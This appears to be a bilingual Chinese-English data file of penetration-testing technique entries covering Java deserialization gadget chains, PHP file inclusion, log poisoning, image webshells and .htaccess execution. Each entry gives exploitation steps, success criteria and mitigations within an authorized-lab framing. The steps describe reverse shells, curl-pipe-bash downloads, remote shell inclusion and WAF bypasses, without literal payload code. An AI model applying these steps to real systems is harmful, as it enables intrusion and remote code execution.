opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用专用无副作用 PHP 测试类验证 allowed_classes 和魔术方法边界，不操作文件或进程。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: Java 反序列化类型边界

description.zh: 覆盖 Java 反序列化 Gadget 链验证：从 CommonsCollections、Spring 等六条链试链，到 ysoserial 生成执行与反弹载荷，再到 JRMP 监听回连利用，确认目标 JDK 可用链。
description.en: Covers Gadget-chain validation for Java deserialization: from trial-firing six chains including CommonsCollections and Spring through ysoserial-generated execution and reverse-shell payloads to JRMP listener callback exploitation, confirming usable chains on the target JDK.

prerequisites.zh: 确认 Java 反序列化类型边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Java Deserialization Type Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: Java 反序列化类型边界针对 ObjectInputStream 还原不可信流的场景：类路径中的 gadget 链在 readObject 阶段触发。覆盖 CommonsCollections、Spring 等六链试链、ysoserial 生成执行与反弹载荷、JRMP 回连四类验证维度。
overview.en: The Java deserialization type boundary targets ObjectInputStream restoring untrusted streams, where classpath gadget chains trigger during readObject. It covers four verification dimensions: chain trials across CommonsCollections, Spring, and four others; ysoserial-generated execution and reverse payloads; and JRMP callback exploitation.

vulnerability.zh: 根因是应用接受不可信序列化流且 ObjectInputFilter 缺失或过宽，类路径中的 CommonsCollections 等库提供可组合的反射与调用 gadget，readObject 期间即可执行任意命令或建立回连。
vulnerability.en: The root cause is accepting untrusted serialization streams with missing or overly broad ObjectInputFilter; classpath libraries such as CommonsCollections supply composable reflection and invocation gadgets, enabling arbitrary command execution or callbacks during readObject.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步六链清单逐条生成序列化文件试链并记录可用链；再用第 2 步生成执行或反弹载荷投递，命中判据为 HTTP 日志收到 shell.sh 请求或监听器获得会话；直连受限时用第 3 步 JRMPListener 配合 JRMPClient 回连。高版本 JDK 报模块错误时改用 --add-opens 变体。
exploitation.en: Use payloads in list order: trial step 1's six-chain list by generating serialization files and record the working chain; then generate execution or reverse payloads with step 2—a shell.sh request in HTTP logs or a listener session is a hit; when direct connections are restricted, pair step 3's JRMPListener with the JRMPClient callback. Use the --add-opens variant for module errors on newer JDKs.

mitigation.zh: 跨信任边界停止使用 Java 原生序列化，迁移期配置进程级与流级 ObjectInputFilter 只允许最小业务类型；移除不需要的 gadget 依赖并隔离反序列化进程。修复后重放第 1、2 步载荷，确认过滤生效且无异常类加载与子进程。
mitigation.en: Stop using native Java serialization across trust boundaries; during migration configure process-level and stream-level ObjectInputFilters allowing only minimal business types; remove unneeded gadget dependencies and isolate deserialization. After the fix, replay the step-1 and step-2 payloads and confirm filtering takes effect with no anomalous class loading or child processes.

title.zh: 批量生成 gadget 链载荷
title.en: Generate a batch of gadget payloads

description.zh: 用 ysoserial 生成 CommonsCollections、Beanutils、Spring 等多条链的序列化文件备用。命中判据：各链均产出可用载荷文件。
description.en: Generate serialized payloads for CC/Beanutils/Spring chains. Success: each chain yields a payload file.

title.zh: 投递探测载荷试链
title.en: Deliver probe payloads to find a live chain

description.zh: 把执行 id 的载荷逐一投递到反序列化入口，定位目标classpath 可用的链。命中判据：日志或回显出现 uid=…。
description.en: Fire id-command payloads one by one to find the chain that works. Success: uid= shows up in logs or echo.

title.zh: 生成下载与反弹载荷

description.zh: 用命中链生成 curl 管道 bash 与 Base64 反弹 Shell 的载荷并投递。命中判据：监听端收到目标回连。
description.en: With the working chain, generate curl|bash and Base64 reverse payloads. Success: the listener receives a callback.

title.zh: 适配高版本 JDK

description.zh: 高版本 JDK 生成报错时追加 --add-opens 参数重新产出载荷。命中判据：生成与触发均正常完成。
description.en: On newer JDKs regenerate with --add-opens flags. Success: generation and triggering both succeed.

title.zh: 搭建 JRMP 回连交互

description.zh: 启动 JRMPListener 等待回连，并投递 JRMPClient 载荷让目标反向连接。命中判据：控制台打印目标回连并完成交互。
description.en: Run JRMPListener and deliver a JRMPClient payload for a reverse connection. Success: the console logs the target connecting.

analysis.zh: Java 反序列化类型边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Java Deserialization Type Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 使用本地测试 DTO 验证 ObjectInputFilter 和允许类型，不分发 ysoserial 链或加载远程类。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 服务端文件包含沙箱边界

description.zh: 覆盖服务端文件包含的执行边界验证：从日志、会话与环境变量文件包含，到 php://input 与 data:// 包装器执行，再到远程文件包含，用于确认包含点到代码执行的可用路径。
description.en: Covers execution-boundary validation of server-side file inclusion: from log, session, and environment-variable file inclusion through php://input and data:// wrapper execution to remote file inclusion, confirming viable paths from inclusion to code execution.

prerequisites.zh: 确认 服务端文件包含沙箱边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Server-Side Include Sandbox Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 服务端文件包含沙箱边界针对包含参数可加载任意本地或远程资源并按 PHP 执行的场景。覆盖日志、会话、环境变量三类载体包含，php://input 与 data:// 包装器执行，以及远程文件包含五类利用路径。
overview.en: The server-side file-inclusion sandbox boundary targets inclusion parameters that can load arbitrary local or remote resources and execute them as PHP. It covers five exploitation paths: log, session, and environment-variable carriers; php://input and data:// wrapper execution; and remote file inclusion.

vulnerability.zh: 根因是用户输入直接决定 include/require 的目标且未限制 scheme 与根目录，任意可读文件、流包装器或远程 URL 的内容被当作 PHP 源码解释，注入其中的代码随包含执行。
vulnerability.en: The root cause is user input directly determining the include/require target without scheme or root restrictions; content of any readable file, stream wrapper, or remote URL is interpreted as PHP source, and code planted inside executes on inclusion.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步在 User-Agent 植入 PHP 并包含访问日志，cmd=whoami 后出现用户名即确认；日志不可用改用第 2 步会话文件或第 3 步 /proc/self/environ；流语义可用时第 4 步经 php://input 或 data:// 直接投递；allow_url_include 开启时第 5 步加载远程 shell.txt。日志路径被拦时改用 URL 编码变体。
exploitation.en: Use payloads in list order: plant PHP in the User-Agent and include the access log per step 1—a username after cmd=whoami confirms it; if logs are unavailable, switch to step 2's session file or step 3's /proc/self/environ; with stream semantics, deliver code directly via step 4's php://input or data://; with allow_url_include on, load remote shell.txt per step 5. Use URL-encoded variants when log paths are blocked.

mitigation.zh: 模板加载使用服务端 ID 映射，禁止用户输入进入 include/require；限制文件根目录与 scheme，关闭 allow_url_include，日志与会话目录不放在可包含路径。修复后重放第 1-5 步载体，确认全部被拒绝且正常模板可用。
mitigation.en: Load templates via server-side ID mapping and keep user input out of include/require; confine file roots and schemes, disable allow_url_include, and keep log and session directories off includable paths. After the fix, replay the step 1-5 carriers and confirm all are rejected while normal templates work.

title.zh: 投毒日志包含执行

description.zh: 在 User-Agent 植入 PHP 代码请求目标写入日志，再经包含参数加载日志并传 cmd。命中判据：响应输出当前用户名。
description.en: Plant PHP code in User-Agent, then include the access log with a cmd parameter. Success: the response prints the username.

title.zh: 会话文件包含执行

description.zh: 向会话写入代码后包含 sess_[PHPSESSID] 文件，/proc/self/environ 可用同样思路投毒。命中判据：命令输出返回响应。
description.en: Write code into the session then include sess_[PHPSESSID]; /proc/self/environ works the same way. Success: command output returns.

title.zh: 输入流与内联数据执行
title.en: Execute via input and inline streams

description.zh: 用 php://input 请求体与 data:// 文本或 Base64 内联流直接承载代码执行。命中判据：输出 whoami 命令结果。
description.en: Carry code in the php://input body or data:// inline streams. Success: whoami output is returned.

title.zh: 远程包含建立控制

description.zh: 让 file 参数加载攻击者服务器上的脚本，建立可持续的执行入口。命中判据：HTTP 日志出现脚本请求且命令执行。
description.en: Point file at a script hosted by the attacker for a lasting entry. Success: HTTP logs show the fetch and commands run.

title.zh: 编码路径绕过拦截

description.zh: 日志路径被拦截时用 URL 编码与双重编码变形后提交包含请求。命中判据：编码后的路径包含成功并执行代码。
description.en: When log paths are blocked, submit URL-encoded and double-encoded variants. Success: the encoded include executes.

analysis.zh: 服务端文件包含沙箱边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Server-Side Include Sandbox Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 只包含沙箱中的静态标记模板，确认规范化路径和允许模板 ID 是否限制实际文件。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 日志到模板解释边界

description.zh: 覆盖日志投毒到代码执行的链路验证：通过污染 User-Agent 并经 LFI 包含访问日志触发解释执行，并对 Nginx 日志路径重复包含验证稳定性，用于确认日志文件可否成为执行载体。
description.en: Covers chain validation from log poisoning to code execution: poisoning the User-Agent and triggering interpreted execution by including the access log via LFI, with repeated inclusion of Nginx log paths to verify stability, confirming whether log files can serve as execution carriers.

prerequisites.zh: 确认 日志到模板解释边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Log-to-Template Interpretation Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 日志到模板解释边界针对日志投毒升级为代码执行的链路：受控请求头写入日志，日志再经文件包含被当作 PHP 解释。覆盖 User-Agent 投毒后对 Apache 与 Nginx 两类访问日志路径的包含验证。
overview.en: The log-to-template interpretation boundary targets log poisoning escalating to code execution: a controlled request header is written to the log, and the log is later included and interpreted as PHP. It covers User-Agent poisoning followed by inclusion against Apache and Nginx access-log paths.

vulnerability.zh: 根因是日志组件原样记录可控请求头，而包含入口接受日志路径且按 PHP 解释其内容；写入载体与解释器两个本应隔离的边界被包含行为连接成执行链。
vulnerability.en: The root cause is the log component recording controllable headers verbatim while an inclusion endpoint accepts log paths and interprets their content as PHP; the write carrier and interpreter, two boundaries that should stay isolated, are joined into an execution chain by inclusion.

exploitation.zh: 按 Payload 列表顺序使用：先用第 1 步以带 eval 标记的 User-Agent 请求目标使其写入 Apache 访问日志，再经 ?file=/var/log/apache2/access.log&cmd=whoami 包含该日志，响应出现用户名即确认执行；Apache 路径不可达时按第 2 步对 /var/log/nginx/access.log 重复同一流程确认跨服务器布局的可达性。日志路径被 WAF 拦截时改用编码绕过变体。
exploitation.en: Use payloads in list order: request the target with an eval-carrying User-Agent per step 1 so it lands in the Apache access log, then include it via ?file=/var/log/apache2/access.log&cmd=whoami—a username in the response confirms execution. If the Apache path is unreachable, repeat the flow against /var/log/nginx/access.log per step 2 to confirm reachability across server layouts. Use the encoding-bypass variants if a WAF blocks log paths.

mitigation.zh: 包含入口拒绝日志等任意路径并使用对象 ID 映射，日志组件对请求头做转义或结构化记录，日志目录与解释器隔离。修复后重放第 1、2 步投毒与包含流程，确认日志仅作为文本返回且无代码解释痕迹。
mitigation.en: Inclusion endpoints must reject arbitrary paths like logs and map by object ID; log components should escape or structurally record headers, and log directories stay isolated from interpreters. After the fix, replay the step 1-2 poisoning and inclusion flows and confirm logs return as text with no interpretation traces.

title.zh: 投毒 Apache 日志并包含

description.zh: 以带 eval 代码的 User-Agent 请求目标写入访问日志，再包含日志并传 cmd 参数执行。命中判据：响应输出当前用户名。
description.en: Log an eval-bearing User-Agent, include the Apache log and pass cmd. Success: the response prints the username.

title.zh: 迁移到 Nginx 日志路径

description.zh: 换成 Nginx 访问日志路径重复投毒与包含流程，覆盖不同服务器布局。命中判据：Nginx 路径同样返回命令输出。
description.en: Repeat the poison-include flow against the Nginx log path. Success: the Nginx path also returns command output.

title.zh: 编码路径绕过 WAF
title.en: Slip encoded paths past the WAF

description.zh: 日志路径被规则拦截时，改用全 URL 编码与双重编码变形提交包含。命中判据：变形路径包含成功并执行代码。
description.en: When rules block the path, submit fully and doubly URL-encoded variants. Success: the encoded include executes.

title.zh: 连接一句话管理后门

description.zh: 用第 1 步植入的 eval 通道连接 WebShell 管理工具，执行文件浏览与命令操作。命中判据：可稳定执行命令并读写文件。
description.en: Connect a shell manager to the eval channel planted in step 1. Success: stable command execution and file access.

analysis.zh: 日志到模板解释边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Log-to-Template Interpretation Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 把纯文本标记写入实验日志，再确认包含或查看路径是否错误地把日志内容当作代码。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: 图片元数据执行边界

description.zh: 覆盖图片马与元数据执行边界：从 Windows copy /b 与 Linux cat 拼接图片马，到 GIF89a 魔术头伪装与 EXIF Comment 注入，再到包含解析与 Apache MIME 映射让 .jpg 按 PHP 执行。
description.en: Covers image-webshell and metadata execution boundaries: from Windows copy /b and Linux cat image-webshell splicing through GIF89a magic-header disguise and EXIF Comment injection to inclusion parsing and Apache MIME mapping that makes .jpg parse as PHP.

prerequisites.zh: 确认 图片元数据执行边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for Image-Metadata Execution Boundary are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

overview.zh: 图片元数据执行边界针对图片文件携带代码绕过上传检查的场景：拼接、魔术头与 EXIF 元数据可让图片成为 PHP 载体。覆盖图片马拼接、GIF89a 与 EXIF 注入、包含解析与 Apache MIME 映射四类利用路径。
overview.en: The image-metadata execution boundary targets images carrying code past upload checks: concatenation, magic headers, and EXIF metadata can turn an image into a PHP carrier. It covers four exploitation paths: image-webshell concatenation, GIF89a and EXIF injection, inclusion/parsing, and Apache MIME mapping.

vulnerability.zh: 根因是上传校验只检查文件头或可预览性而不清洗内容，存储的图片又可被包含入口按 PHP 解释，或被 MIME 映射直接交给 PHP 处理器，图片内的代码因此获得执行机会。
vulnerability.en: The root cause is upload validation that checks only headers or previewability without sanitizing content, combined with stored images being includable as PHP or handed to the PHP handler via MIME mapping—code inside the image thus gets an execution path.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 copy /b 或 cat 把 PHP 代码拼进图片生成 shell.jpg；只查文件头时用第 2 步 GIF89a 或 exiftool 写入 Comment；上传后按第 3 步经包含参数或 phar:// 访问并传 cmd=whoami，返回用户名即执行；扩展名被拦时按第 4 步加 AddType 后直接访问 .jpg。
exploitation.en: Use payloads in list order: append PHP into an image via copy /b or cat in step 1 to produce shell.jpg; when only headers are checked, use step 2's GIF89a or exiftool Comment; after upload, access it through the inclusion parameter or phar:// per step 3 with cmd=whoami—a returned username confirms execution; when extensions are blocked, add AddType per step 4 and request the .jpg directly.

mitigation.zh: 上传图片做完整解码重编码，剥离非常规元数据并按允许列表校验真实类型；上传目录不可执行，包含入口拒绝上传路径，服务器不把图片扩展映射到 PHP。修复后重放第 1-4 步，确认图片马无法落地执行且正常图片可用。
mitigation.en: Fully decode and re-encode uploaded images, strip non-standard metadata, and validate real type against an allowlist; keep upload directories non-executable, reject upload paths at inclusion endpoints, and never map image extensions to PHP. After the fix, replay steps 1-4 and confirm image webshells cannot land or execute while normal images work.

title.zh: 制作图片马

description.zh: Windows 用 copy /b、Linux 用 cat 把 PHP 代码追加到图片尾部生成 shell.jpg。命中判据：文件保留图片头且携带代码。
description.en: Append PHP code to an image via copy /b or cat to build shell.jpg. Success: the file keeps its image header and code.

title.zh: 伪造魔术头与元数据

description.zh: 加 GIF89a 魔术头伪装，或用 exiftool 把 PHP 代码写入图片 Comment 字段。命中判据：仅查头部或可预览性的检测放行。
description.en: Prepend a GIF89a header or write code into the EXIF Comment field. Success: header-only checks let it through.

title.zh: 包含解析图片马
title.en: Include and execute the image shell

description.zh: 经文件包含参数与 phar:// 流访问已上传的 shell.jpg 执行内嵌代码。命中判据：cmd=whoami 返回当前用户名。
description.en: Reach the uploaded shell.jpg through include params or phar://. Success: cmd=whoami returns the username.

title.zh: 配置映射让 jpg 执行

description.zh: Apache 配置 AddType 把 .jpg 映射给 PHP 处理器后直接访问上传目录。命中判据：图片 URL 返回命令输出。
description.en: Map .jpg to PHP via AddType and hit the upload path directly. Success: the image URL returns command output.

title.zh: 快速生成伪装文件

description.zh: 需要最小文件通过头部检查时，直接生成仅含 GIF89a 头的文本文件。命中判据：文件通过魔术头校验。
description.en: When a minimal file suffices, emit a GIF89a-header-only stub. Success: it passes magic-byte checks.

analysis.zh: 图片元数据执行边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: Image-Metadata Execution Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: 一次只运行一个唯一标记，并限制请求次数、响应保存范围和实验持续时间。
opsecTips.en: Run one unique marker at a time and limit request count, retained response data, and experiment duration.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

review.rationale: 在固定测试图片中写入纯文本元数据，确认上传和处理链是否把元数据交给命令或模板解释器。 保留原有合法攻击样例与变体，仅替换已证实的失效占位、协议错误或事实混淆，并补齐授权实验边界、检测证据、双语教程和权威引用。

name.zh: Web 服务器目录配置边界

description.zh: 覆盖 .htaccess 目录配置执行边界：从 AddType/AddHandler 映射 PHP 处理，到 auto_prepend_file 自动包含与 ErrorDocument 指向 WebShell 等，确认配置上传后的执行影响。
description.en: Covers execution boundaries of .htaccess directory configuration: from AddType/AddHandler PHP mapping through auto_prepend_file automatic inclusion and ErrorDocument pointing to a webshell, confirming execution impact once such a config file is uploaded.

prerequisites.zh: 确认 Web 服务器目录配置边界 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
